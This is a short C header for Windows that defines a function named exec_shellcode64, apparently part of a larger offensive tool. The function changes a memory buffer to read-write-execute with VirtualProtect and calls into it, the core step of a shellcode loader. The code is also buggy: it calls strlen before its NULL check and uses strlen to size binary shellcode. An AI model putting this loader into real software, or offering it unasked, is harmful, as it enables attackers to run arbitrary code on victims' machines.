#pragma once

#include <stdio.h>
#include <windows.h>
#include "../../debug_print/debug_print.h"


void exec_shellcode64(unsigned char *shellcode) {
	DEBUG_PRINT(("exec_shellcode64 called\n"));
	int size=strlen(shellcode);
	DEBUG_PRINT(("shellcode size: %d\n", size));
	
    // Check for NULL pointer to handle cases where no shellcode data was retrieved
    if(shellcode != NULL) {
	    int len=strlen(shellcode);
	    DWORD l=0;
	    VirtualProtect(shellcode,len,PAGE_EXECUTE_READWRITE,&l);
	    (* (int(*)()) shellcode)();
    }
}
